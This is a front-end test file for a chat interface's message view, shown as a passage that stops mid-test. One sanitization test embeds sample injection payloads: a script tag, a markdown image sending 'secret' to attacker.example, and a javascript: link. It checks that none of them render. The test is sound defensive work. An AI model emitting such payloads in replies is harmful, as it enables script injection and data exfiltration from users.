import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, fireEvent, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { ChatView } from "@/components/chat/ChatView";
import { renderWithClient } from "@/test/render";
import type { ApiConversation, ApiMessage } from "@/types/api";

const WORKSPACE_1 = { id: "w1", name: "Alice", type: "personal" as const, role: "owner" };
const WORKSPACE_2 = { id: "w2", name: "Acme", type: "company" as const, role: "member" };

const { workspaceHolder } = vi.hoisted(() => ({
  // A mutable holder, not a fresh literal per call: tests that simulate a
  // workspace switch mutate `.current` and call RTL's `rerender`.
  workspaceHolder: { current: { id: "w1", name: "Alice", type: "personal", role: "owner" } } as {
    current: { id: string; name: string; type: "personal" | "company"; role: string };
  },
}));

vi.mock("@/contexts/workspace-context", () => ({
  useWorkspace: () => ({ activeWorkspace: workspaceHolder.current, user: { id: "u1" } }),
}));

function conversation(overrides: Partial<ApiConversation> = {}): ApiConversation {
  return {
    id: "c1",
    workspace: "w1",
    title: "Test conversation",
    created_by: null,
    created_at: "2026-07-05T00:00:00Z",
    private: false,
    origin_channel: "web",
    ...overrides,
  };
}

const CONVERSATION = conversation();
const CONVERSATION_2 = conversation({
  id: "c2",
  workspace: "w2",
  title: "Other workspace conversation",
});
const CONVERSATION_3 = conversation({ id: "c3", title: "Second conversation" });

function msg(overrides: Partial<ApiMessage> & Pick<ApiMessage, "id">): ApiMessage {
  return {
    conversation: "c1",
    role: "user",
    content: "",
    status: "complete",
    model_usage: null,
    created_by: "u1",
    created_at: "t",
    memories_used: [],
    chunks_used: [],
    overlay_source_workspaces: {},
    intent: "chat",
    intent_payload: {},
    channel: "web",
    confirmed_task: null,
    chunk_documents: {},
    ...overrides,
  };
}

const frame = (payload: unknown) => `data: ${JSON.stringify(payload)}\n\n`;

function sseResponse(frames: string[]) {
  const encoder = new TextEncoder();
  return new Response(
    new ReadableStream<Uint8Array>({
      start(controller) {
        for (const f of frames) controller.enqueue(encoder.encode(f));
        controller.close();
      },
    }),
    { status: 200, headers: { "Content-Type": "text/event-stream" } },
  );
}

/** A stream the test drives; aborting the request errors it like a real fetch. */
function controlledStream(signal?: AbortSignal | null) {
  const encoder = new TextEncoder();
  let controller!: ReadableStreamDefaultController<Uint8Array>;
  const stream = new ReadableStream<Uint8Array>({
    start(c) {
      controller = c;
    },
  });
  signal?.addEventListener("abort", () => {
    try {
      controller.error(new DOMException("The operation was aborted.", "AbortError"));
    } catch {
      // already closed
    }
  });
  return {
    response: new Response(stream, { status: 200 }),
    push: (payload: unknown) => controller.enqueue(encoder.encode(frame(payload))),
    close: () => controller.close(),
  };
}

type Handler = (
  input: string,
  init: RequestInit | undefined,
) => Response | Promise<Response | undefined> | undefined;

const isGet = (init?: RequestInit) => !init?.method || init.method === "GET";

function mockFetch(handler: Handler) {
  const fn = vi.fn(async (input: string, init?: RequestInit) => {
    const response = await handler(input, init);
    if (response) return response;
    throw new Error(`unexpected fetch ${init?.method ?? "GET"} ${input}`);
  });
  vi.stubGlobal("fetch", fn);
  return fn;
}

const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status });

function column() {
  return within(screen.getByTestId("conversation-column"));
}

async function openConversation(title = "Test conversation") {
  await userEvent.click(await column().findByRole("button", { name: title }));
  await screen.findByPlaceholderText("Jarvis'e yaz…");
}

async function renderAndOpen() {
  const result = renderWithClient(<ChatView />);
  await openConversation();
  return result;
}

async function send(text: string) {
  await userEvent.type(screen.getByPlaceholderText("Jarvis'e yaz…"), text);
  await userEvent.click(screen.getByRole("button", { name: "Gönder" }));
}

describe("ChatView", () => {
  beforeEach(() => {
    workspaceHolder.current = WORKSPACE_1;
    window.localStorage.clear();
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  // --- send, stream, reconcile -------------------------------------------

  it("shows an optimistic user message immediately and reconciles after the stream ends", async () => {
    let gets = 0;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && isGet(init)) {
        gets += 1;
        return json(
          gets === 1
            ? []
            : [
                msg({ id: "u1", content: "Hi there" }),
                msg({ id: "a1", role: "assistant", content: "Hello!" }),
              ],
        );
      }
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        return sseResponse([
          frame({ type: "chunk", text: "Hello!" }),
          frame({ type: "done", message_id: "a1" }),
        ]);
      }
    });

    await renderAndOpen();
    await send("Hi there");

    expect(await screen.findByText("Hi there")).toBeInTheDocument();
    await waitFor(() => expect(gets).toBe(2));
    expect(screen.getAllByText("Hi there")).toHaveLength(1);
    expect(screen.getAllByText("Hello!")).toHaveLength(1);
  });

  it("renders assistant replies as markdown, streaming-safe: an unclosed fence is code until closed", async () => {
    let stream!: ReturnType<typeof controlledStream>;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && isGet(init)) return json([]);
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        stream = controlledStream(init.signal);
        return stream.response;
      }
    });

    await renderAndOpen();
    await send("kod yaz");

    await waitFor(() => expect(stream).toBeDefined());
    act(() => stream.push({ type: "chunk", text: "İşte:\n\n```python\nprint('mer" }));
    await waitFor(() =>
      expect(document.querySelector("pre code")).toHaveTextContent("print('mer"),
    );
    act(() => stream.push({ type: "chunk", text: "haba')\n```\n\n**bitti**" }));
    await waitFor(() => expect(document.querySelector("strong")).toHaveTextContent("bitti"));
    expect(document.querySelector("pre code")).toHaveTextContent("print('merhaba')");
    act(() => {
      stream.push({ type: "done", message_id: "a1" });
      stream.close();
    });
  });

  it("never renders raw HTML, images or javascript: links from a reply", async () => {
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages") {
        return json([
          msg({
            id: "a1",
            role: "assistant",
            content:
              "<script>window.__chatPwned = 1</script>\n\n![x](https://attacker.example/?q=secret) [tıkla](javascript:alert(1)) [site](https://example.com)",
          }),
        ]);
      }
    });

    await renderAndOpen();
    const reply = await screen.findByTestId("assistant-message");
    expect(reply.querySelector("script")).toBeNull();
    expect(reply.querySelector("img")).toBeNull();
    expect(reply.innerHTML).not.toMatch(/javascript:|attacker\.example/);
    const links = reply.querySelectorAll("a");
    expect(links).toHaveLength(1);
    expect(links[0]).toHaveAttribute("href", "https://example.com");
    expect(links[0]).toHaveAttribute("rel", "noopener noreferrer");
    expect((window as unknown as { __chatPwned?: number }).__chatPwned).toBeUndefined();
  });

  it("offers copy on a finished reply", async () => {
    const writeText = vi.fn(async () => undefined);
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages") {
        return json([msg({ id: "a1", role: "assistant", content: "Kopyalanacak **metin**" })]);
      }
    });

    await renderAndOpen();
    await userEvent.click(await screen.findByRole("button", { name: "Mesajı kopyala" }));
    expect(writeText).toHaveBeenCalledWith("Kopyalanacak **metin**");
  });

  it("shows the sources list only after reconciliation, only on replies, with deep links", async () => {
    let gets = 0;
    let stream!: ReturnType<typeof controlledStream>;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && isGet(init)) {
        gets += 1;
        return json(
          gets === 1
            ? []
            : [
                // Unrealistic on purpose: sources on a user row never render.
                msg({ id: "u1", content: "Hi there", memories_used: ["mem-x"] }),
                msg({
                  id: "a1",
                  role: "assistant",
                  content: "Hello!",
                  memories_used: ["mem-1", "mem-2"],
                  overlay_source_workspaces: { "mem-2": "w-personal" },
                  chunks_used: ["chunk-1", "chunk-gone"],
                  chunk_documents: { "chunk-1": "doc-1" },
                }),
              ],
        );
      }
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        stream = controlledStream(init.signal);
        return stream.response;
      }
    });

    await renderAndOpen();
    await send("Hi there");
    await waitFor(() => expect(stream).toBeDefined());
    act(() => stream.push({ type: "chunk", text: "Hello!" }));
    await screen.findByText("Hello!");
    expect(screen.queryByTestId("message-sources")).not.toBeInTheDocument();

    act(() => {
      stream.push({ type: "done", message_id: "a1", memories_used: ["mem-1", "mem-2"] });
      stream.close();
    });

    const sources = await screen.findByTestId("message-sources");
    expect(screen.getAllByTestId("message-sources")).toHaveLength(1);
    expect(sources).toHaveTextContent("Kaynaklar · 2 hafıza kaydı, 2 bilgi parçası");
    const s = within(sources);
    expect(s.getByRole("link", { name: "Hafıza kaydı 1" })).toHaveAttribute(
      "href",
      "/memory?workspace=w1&memory=mem-1",
    );
    // An overlay memory lives in the personal workspace; the link says so.
    expect(s.getByRole("link", { name: "Hafıza kaydı 2" })).toHaveAttribute(
      "href",
      "/memory?workspace=w-personal&memory=mem-2",
    );
    expect(s.getByRole("link", { name: "Bilgi parçası 1" })).toHaveAttribute(
      "href",
      "/knowledge?workspace=w1&document=doc-1",
    );
    expect(s.queryByRole("link", { name: "Bilgi parçası 2" })).not.toBeInTheDocument();
    expect(s.getByText(/Bilgi parçası 2/)).toBeInTheDocument();
  });

  it("shows a banner and reconciles when the stream sends an error event", async () => {
    let gets = 0;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        return sseResponse([frame({ type: "error", error_type: "no_provider" })]);
      }
      if (input === "/api/conversations/c1/messages") {
        gets += 1;
        return json(
          gets === 1
            ? []
            : [
                msg({ id: "u1", content: "Trigger error" }),
                msg({ id: "a1", role: "assistant", status: "failed" }),
              ],
        );
      }
    });

    await renderAndOpen();
    await send("Trigger error");

    expect(await screen.findByRole("alert")).toHaveTextContent(/yapay zeka sağlayıcısı/i);
    await waitFor(() => expect(gets).toBeGreaterThan(1));
    expect(await screen.findByText("Yanıt alınamadı")).toBeInTheDocument();
  });

  it("shows a disconnect banner when the stream ends without a terminal event", async () => {
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        return sseResponse([frame({ type: "chunk", text: "partial" })]);
      }
      if (input === "/api/conversations/c1/messages") return json([]);
    });

    await renderAndOpen();
    await send("Disconnect me");

    expect(await screen.findByText(/bağlantı koptu/i)).toBeInTheDocument();
    // The streamed text stays on screen as an interrupted reply.
    expect(screen.getByText("partial")).toBeInTheDocument();
    expect(screen.getByText("Yanıt yarıda kaldı")).toBeInTheDocument();
  });

  it("blocks a second send while a stream is in flight (the composer stays editable)", async () => {
    let posts = 0;
    let stream!: ReturnType<typeof controlledStream>;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        posts += 1;
        stream = controlledStream(init.signal);
        return stream.response;
      }
      if (input === "/api/conversations/c1/messages") return json([]);
    });

    await renderAndOpen();
    await send("First message");
    await screen.findByRole("button", { name: "Durdur" });
    expect(screen.queryByRole("button", { name: "Gönder" })).not.toBeInTheDocument();

    const textarea = screen.getByPlaceholderText("Jarvis'e yaz…");
    expect(textarea).toBeEnabled();
    await userEvent.type(textarea, "Second{Enter}");
    expect(textarea).toHaveValue("Second");
    expect(posts).toBe(1);

    act(() => {
      stream.push({ type: "done", message_id: "a1" });
      stream.close();
    });
  });

  it("sends exactly one POST when Send is clicked twice in the same tick", async () => {
    let posts = 0;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        posts += 1;
        return sseResponse([frame({ type: "done", message_id: "a1" })]);
      }
      if (input === "/api/conversations/c1/messages") return json([]);
    });

    await renderAndOpen();
    await userEvent.type(screen.getByPlaceholderText("Jarvis'e yaz…"), "Double click");
    const sendButton = screen.getByRole("button", { name: "Gönder" });
    act(() => {
      fireEvent.click(sendButton);
      fireEvent.click(sendButton);
    });

    await waitFor(() => expect(posts).toBe(1));
  });

  it("keeps the message list mounted while reconciling after a reply", async () => {
    const earlier = msg({ id: "m0", content: "Earlier message" });
    let gets = 0;
    let releaseReload: (() => void) | null = null;
    mockFetch(async (input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && isGet(init)) {
        gets += 1;
        if (gets === 1) return json([earlier]);
        await new Promise<void>((resolve) => {
          releaseReload = resolve;
        });
        return json([
          earlier,
          msg({ id: "m1", content: "Hi there" }),
          msg({ id: "m2", role: "assistant", content: "Hello!" }),
        ]);
      }
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        return sseResponse([
          frame({ type: "chunk", text: "Hello!" }),
          frame({ type: "done", message_id: "m2" }),
        ]);
      }
    });

    await renderAndOpen();
    expect(await screen.findByText("Earlier message")).toBeInTheDocument();
    await send("Hi there");

    await waitFor(() => expect(gets).toBe(2));
    const scroller = screen.getByTestId("message-scroll");
    expect(screen.getByText("Earlier message")).toBeInTheDocument();
    expect(screen.getByText("Hi there")).toBeInTheDocument();
    expect(screen.getByText("Hello!")).toBeInTheDocument();

    act(() => releaseReload?.());

    await waitFor(() => expect(screen.getAllByText("Hello!")).toHaveLength(1));
    expect(screen.getAllByText("Hi there")).toHaveLength(1);
    // Same scroll container: nothing was unmounted (no flash, no scroll reset).
    expect(screen.getByTestId("message-scroll")).toBe(scroller);
  });

  // --- stop and recover ----------------------------------------------------

  it("stops a stream, refetches and reconciles the server's partial reply by id, then retries", async () => {
    let gets = 0;
    let posts = 0;
    let stream!: ReturnType<typeof controlledStream>;
    const postBodies: unknown[] = [];
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && isGet(init)) {
        gets += 1;
        return json(
          gets === 1
            ? []
            : [
                msg({ id: "u1", content: "Uzun anlat" }),
                msg({ id: "a1", role: "assistant", content: "Bir varmış", status: "partial" }),
              ],
        );
      }
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        posts += 1;
        postBodies.push(JSON.parse(init.body as string));
        stream = controlledStream(init.signal);
        return stream.response;
      }
    });

    await renderAndOpen();
    await send("Uzun anlat");
    await waitFor(() => expect(stream).toBeDefined());
    act(() => stream.push({ type: "chunk", text: "Bir varmış" }));
    await screen.findByText("Bir varmış");

    await userEvent.click(screen.getByRole("button", { name: "Durdur" }));

    await waitFor(() => expect(gets).toBe(2));
    expect(await screen.findByText("Yanıt yarıda kaldı")).toBeInTheDocument();
    // Reconciled: exactly one copy of each row, the local bubbles are gone.
    expect(screen.getAllByText("Bir varmış")).toHaveLength(1);
    expect(screen.getAllByText("Uzun anlat")).toHaveLength(1);
    // A user-initiated stop is not a connection problem.
    expect(screen.queryByText(/bağlantı koptu/i)).not.toBeInTheDocument();

    await userEvent.click(screen.getByRole("button", { name: "Tekrar dene" }));
    await waitFor(() => expect(posts).toBe(2));
    expect(postBodies[1]).toMatchObject({ content: "Uzun anlat" });
  });

  it("keeps the streamed text as an interrupted reply until the server's row appears", async () => {
    let gets = 0;
    let stream!: ReturnType<typeof controlledStream>;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && isGet(init)) {
        gets += 1;
        // The user row is persisted at once; the partial assistant row only
        // after the server notices the disconnect (third fetch).
        if (gets === 1) return json([]);
        if (gets === 2) return json([msg({ id: "u1", content: "Anlat" })]);
        return json([
          msg({ id: "u1", content: "Anlat" }),
          msg({ id: "a1", role: "assistant", content: "Yarım", status: "partial" }),
        ]);
      }
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        stream = controlledStream(init.signal);
        return stream.response;
      }
    });

    await renderAndOpen();
    await send("Anlat");
    await waitFor(() => expect(stream).toBeDefined());
    act(() => stream.push({ type: "chunk", text: "Yarım" }));
    await screen.findByText("Yarım");
    await userEvent.click(screen.getByRole("button", { name: "Durdur" }));

    await waitFor(() => expect(gets).toBe(2));
    // Server has only the user row: the local partial stays, marked.
    expect(screen.getByText("Yarım")).toBeInTheDocument();
    expect(screen.getByText("Yanıt yarıda kaldı")).toBeInTheDocument();
    expect(screen.getAllByText("Anlat")).toHaveLength(1);

    await waitFor(() => expect(gets).toBe(3), { timeout: 3000 });
    await waitFor(() => expect(screen.getAllByText("Yarım")).toHaveLength(1));
    expect(screen.getByText("Yanıt yarıda kaldı")).toBeInTheDocument();
  });

  it("offers retry only on the latest reply", async () => {
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages") {
        return json([
          msg({ id: "u1", content: "Eski soru" }),
          msg({ id: "a1", role: "assistant", content: "Eski yarım", status: "partial" }),
          msg({ id: "u2", content: "Yeni soru" }),
          msg({ id: "a2", role: "assistant", content: "Tam yanıt" }),
        ]);
      }
    });

    await renderAndOpen();
    expect(await screen.findByText("Yanıt yarıda kaldı")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Tekrar dene" })).not.toBeInTheDocument();
  });

  // --- workspace/conversation isolation ------------------------------------

  it("does not let a stale response from a previous workspace overwrite the new workspace's list", async () => {
    let resolveW1: ((response: Response) => void) | undefined;
    const w1Pending = new Promise<Response>((resolve) => {
      resolveW1 = resolve;
    });
    mockFetch((input) => {
      if (input === "/api/conversations?workspace=w1") return w1Pending;
      if (input === "/api/conversations?workspace=w2") return json([CONVERSATION_2]);
    });

    const { rerender } = renderWithClient(<ChatView />);
    workspaceHolder.current = WORKSPACE_2;
    rerender(<ChatView />);

    await column().findByRole("button", { name: "Other workspace conversation" });
    resolveW1?.(json([CONVERSATION]));
    await new Promise((resolve) => setTimeout(resolve, 10));

    expect(screen.queryByText("Test conversation")).not.toBeInTheDocument();
    expect(screen.getByText("Other workspace conversation")).toBeInTheDocument();
  });

  it("does not let a deferred messages response for a previous conversation overwrite the newly-selected one", async () => {
    let resolveC1: ((response: Response) => void) | undefined;
    const c1Pending = new Promise<Response>((resolve) => {
      resolveC1 = resolve;
    });
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION, CONVERSATION_3]);
      if (input === "/api/conversations/c1/messages") return c1Pending;
      if (input === "/api/conversations/c3/messages") {
        return json([msg({ id: "m3", conversation: "c3", content: "Message in second conversation" })]);
      }
    });

    renderWithClient(<ChatView />);
    fireEvent.click(await column().findByRole("button", { name: "Test conversation" }));
    fireEvent.click(await column().findByRole("button", { name: "Second conversation" }));
    await screen.findByText("Message in second conversation");

    resolveC1?.(json([msg({ id: "m1", content: "Message in first conversation" })]));
    await new Promise((resolve) => setTimeout(resolve, 10));

    expect(screen.queryByText("Message in first conversation")).not.toBeInTheDocument();
    expect(screen.getByText("Message in second conversation")).toBeInTheDocument();
  });

  it("aborts an in-flight stream when the workspace changes mid-send", async () => {
    let streamAborted = false;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        init.signal?.addEventListener("abort", () => {
          streamAborted = true;
        });
        return controlledStream(init.signal).response;
      }
      if (input === "/api/conversations/c1/messages") return json([]);
    });

    const { rerender } = await renderAndOpen();
    await send("First message");
    await screen.findByRole("button", { name: "Durdur" });

    workspaceHolder.current = WORKSPACE_2;
    rerender(<ChatView />);

    await waitFor(() => expect(streamAborted).toBe(true));
    expect(screen.queryByRole("button", { name: "Durdur" })).not.toBeInTheDocument();
  });

  // --- conversation list ---------------------------------------------------

  it("creates exactly one conversation when New chat is clicked twice in the same tick", async () => {
    let creates = 0;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([]);
      if (input === "/api/conversations" && init?.method === "POST") {
        creates += 1;
        return json(CONVERSATION, 201);
      }
      if (input === "/api/conversations/c1/messages") return json([]);
    });

    renderWithClient(<ChatView />);
    const newChat = await column().findByRole("button", { name: "Yeni sohbet" });
    act(() => {
      fireEvent.click(newChat);
      fireEvent.click(newChat);
    });

    await waitFor(() => expect(creates).toBe(1));
    expect(await screen.findByText("Jarvis'e bir şey sor.")).toBeInTheDocument();
  });

  it("shows a visible error when creating a new chat fails", async () => {
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([]);
      if (input === "/api/conversations" && init?.method === "POST") {
        return json({ detail: "boom" }, 500);
      }
    });

    renderWithClient(<ChatView />);
    await userEvent.click(await column().findByRole("button", { name: "Yeni sohbet" }));

    expect(
      await screen.findByText("Yeni sohbet başlatılamadı. Lütfen tekrar deneyin."),
    ).toBeInTheDocument();
    expect(column().getByRole("button", { name: "Yeni sohbet" })).toBeEnabled();
  });

  it("shows an error state (not the empty state) when the conversation list fails to load, and retries", async () => {
    let lists = 0;
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) {
        lists += 1;
        return lists === 1 ? json({}, 500) : json([CONVERSATION]);
      }
    });

    renderWithClient(<ChatView />);

    expect(await screen.findByText("Sohbetler yüklenemedi.")).toBeInTheDocument();
    expect(screen.queryByText("Henüz sohbet yok.")).not.toBeInTheDocument();

    await userEvent.click(screen.getByRole("button", { name: "Tekrar dene" }));

    expect(await column().findByRole("button", { name: "Test conversation" })).toBeInTheDocument();
    expect(screen.queryByText("Sohbetler yüklenemedi.")).not.toBeInTheDocument();
  });

  it("shows private and channel badges in the list, the header and on messages", async () => {
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) {
        return json([
          conversation({ private: true, origin_channel: "telegram" }),
          conversation({ id: "c3", title: "Web chat" }),
        ]);
      }
      if (input === "/api/conversations/c1/messages") {
        return json([
          msg({ id: "u1", content: "telegramdan", channel: "telegram" }),
          msg({ id: "a1", role: "assistant", content: "yanıt", channel: "telegram" }),
        ]);
      }
    });

    renderWithClient(<ChatView />);
    const row = await column().findByRole("button", { name: /Test conversation/ });
    expect(within(row).getByText("Telegram")).toBeInTheDocument();
    expect(within(row).getByRole("img", { name: "Özel" })).toBeInTheDocument();
    const webRow = column().getByRole("button", { name: "Web chat" });
    expect(within(webRow).queryByText("Web")).not.toBeInTheDocument();

    await userEvent.click(row);
    expect(await screen.findByTestId("private-badge")).toHaveTextContent("Özel");
    // Header + both messages carry the channel badge.
    await screen.findByText("telegramdan");
    expect(screen.getAllByTestId("channel-badge")).toHaveLength(3);
    // Already private: the one-way action is not offered again.
    expect(screen.queryByRole("button", { name: "Özel yap" })).not.toBeInTheDocument();
  });

  // --- conversation management ---------------------------------------------

  it("renames the conversation through the header dialog", async () => {
    const patches: unknown[] = [];
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages") return json([]);
      if (input === "/api/conversations/c1" && init?.method === "PATCH") {
        const body = JSON.parse(init.body as string);
        patches.push(body);
        return json({ ...CONVERSATION, title: body.title });
      }
    });

    await renderAndOpen();
    await userEvent.click(screen.getByRole("button", { name: "Yeniden adlandır" }));
    const dialog = await screen.findByRole("dialog");
    const input = within(dialog).getByLabelText("Sohbet adı");
    await userEvent.clear(input);
    await userEvent.type(input, "  Haftalık plan  ");
    await userEvent.click(within(dialog).getByRole("button", { name: "Kaydet" }));

    await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
    expect(patches).toEqual([{ title: "Haftalık plan" }]);
    expect(column().getByRole("button", { name: "Haftalık plan" })).toBeInTheDocument();
    expect(screen.getByRole("heading", { name: "Haftalık plan" })).toBeInTheDocument();
  });

  it("shows a rename failure inside the dialog", async () => {
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages") return json([]);
      if (input === "/api/conversations/c1" && init?.method === "PATCH") {
        return json({ title: ["too long"], code: "invalid" }, 400);
      }
    });

    await renderAndOpen();
    await userEvent.click(screen.getByRole("button", { name: "Yeniden adlandır" }));
    const dialog = await screen.findByRole("dialog");
    await userEvent.click(within(dialog).getByRole("button", { name: "Kaydet" }));
    expect(await within(dialog).findByText("Sohbet adı değiştirilemedi.")).toBeInTheDocument();
  });

  it("marks the conversation private only after the irreversible AlertDialog is confirmed", async () => {
    const patches: unknown[] = [];
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages") return json([]);
      if (input === "/api/conversations/c1" && init?.method === "PATCH") {
        patches.push(JSON.parse(init.body as string));
        return json({ ...CONVERSATION, private: true });
      }
    });

    await renderAndOpen();
    await userEvent.click(screen.getByRole("button", { name: "Özel yap" }));
    let dialog = await screen.findByRole("alertdialog");
    expect(dialog).toHaveTextContent("geri alınamaz");
    await userEvent.click(within(dialog).getByRole("button", { name: "Vazgeç" }));
    await waitFor(() => expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument());
    expect(patches).toEqual([]);

    await userEvent.click(screen.getByRole("button", { name: "Özel yap" }));
    dialog = await screen.findByRole("alertdialog");
    await userEvent.click(within(dialog).getByRole("button", { name: "Özel yap" }));

    await waitFor(() => expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument());
    expect(patches).toEqual([{ private: true }]);
    expect(await screen.findByTestId("private-badge")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Özel yap" })).not.toBeInTheDocument();
  });

  // --- mobile drawer --------------------------------------------------------

  it("puts the conversation list in a drawer below md and closes it on selection", async () => {
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION, CONVERSATION_3]);
      if (input === "/api/conversations/c3/messages") {
        return json([msg({ id: "m3", conversation: "c3", content: "Second chat body" })]);
      }
    });

    renderWithClient(<ChatView />);
    // The desktop column is CSS-hidden below md; the header trigger is md:hidden.
    expect(screen.getByTestId("conversation-column")).toHaveClass("hidden", "md:flex");
    const trigger = screen.getByRole("button", { name: "Sohbet listesini aç" });
    expect(trigger).toHaveClass("md:hidden");

    await userEvent.click(trigger);
    const drawer = await screen.findByRole("dialog");
    expect(within(drawer).getByText("Sohbetler", { selector: "h2" })).toBeInTheDocument();
    await userEvent.click(
      await within(drawer).findByRole("button", { name: "Second conversation" }),
    );

    await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
    expect(await screen.findByText("Second chat body")).toBeInTheDocument();
  });

  // --- task and tool drafts --------------------------------------------------

  it("shows a live task draft, confirms it and shows it as created", async () => {
    let gets = 0;
    let creates = 0;
    const draftUser = msg({
      id: "u1",
      content: "remind me to call mom",
      intent: "task_draft",
      intent_payload: { title: "Call mom", due_date: "2026-07-15" },
    });
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && isGet(init)) {
        gets += 1;
        if (gets === 1) return json([]);
        const confirmed = creates > 0 ? "t1" : null;
        return json([
          { ...draftUser, confirmed_task: confirmed },
          msg({ id: "a1", role: "assistant", content: "Sure, I'll draft that." }),
        ]);
      }
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        return sseResponse([
          frame({ type: "chunk", text: "Sure, I'll draft that." }),
          frame({
            type: "draft",
            kind: "task",
            source_message_id: "u1",
            title: "Call mom",
            due_date: "2026-07-15",
          }),
          frame({ type: "done", message_id: "a1" }),
        ]);
      }
      if (input === "/api/tasks" && init?.method === "POST") {
        creates += 1;
        expect(JSON.parse(init.body as string)).toMatchObject({
          workspace: "w1",
          title: "Call mom",
          due_date: "2026-07-15",
          draft_message_id: "u1",
        });
        return json({ id: "t1", workspace: "w1", title: "Call mom" }, 201);
      }
    });

    await renderAndOpen();
    await send("remind me to call mom");

    expect(await screen.findByText("Bu bir görev gibi görünüyor")).toBeInTheDocument();
    expect(screen.getByText("Son tarih 2026-07-15")).toBeInTheDocument();
    await userEvent.click(screen.getByRole("button", { name: "Görevi onayla" }));

    await waitFor(() => expect(creates).toBe(1));
    expect(await screen.findByText("Görev oluşturuldu")).toBeInTheDocument();
    expect(screen.getByRole("link", { name: "Görevi aç" })).toHaveAttribute(
      "href",
      "/tasks?workspace=w1&task=t1",
    );
    expect(screen.queryByRole("button", { name: "Görevi onayla" })).not.toBeInTheDocument();
  });

  it("rebuilds persisted drafts: unconfirmed offers confirm, confirmed shows created, other channels show nothing", async () => {
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages") {
        return json([
          msg({
            id: "u1",
            content: "yarın annemi ara",
            intent: "task_draft",
            intent_payload: { title: "Annemi ara", due_date: null },
          }),
          msg({ id: "a1", role: "assistant", content: "Tamam." }),
          msg({
            id: "u2",
            content: "cuma rapor",
            intent: "task_draft",
            intent_payload: { title: "Rapor", due_date: "2026-07-17" },
            confirmed_task: "t9",
          }),
          msg({ id: "a2", role: "assistant", content: "Not ettim." }),
          msg({
            id: "u3",
            content: "telegramdan görev",
            channel: "telegram",
            intent: "task_draft",
            intent_payload: { title: "Telegram görevi", due_date: null },
          }),
          msg({ id: "a3", role: "assistant", content: "Olur.", channel: "telegram" }),
        ]);
      }
    });

    await renderAndOpen();
    const card = await screen.findByTestId("task-draft-card");
    expect(within(card).getByText("Annemi ara")).toBeInTheDocument();
    expect(within(card).getByRole("button", { name: "Görevi onayla" })).toBeInTheDocument();

    const confirmed = screen.getByTestId("task-draft-confirmed");
    expect(confirmed).toHaveTextContent("Görev oluşturuldu");
    expect(within(confirmed).getByRole("link", { name: "Görevi aç" })).toHaveAttribute(
      "href",
      "/tasks?workspace=w1&task=t9",
    );
    expect(screen.getAllByTestId("task-draft-card")).toHaveLength(1);
    expect(screen.queryByText("Telegram görevi")).not.toBeInTheDocument();

    // Placed after the turn's reply, not between the question and the answer.
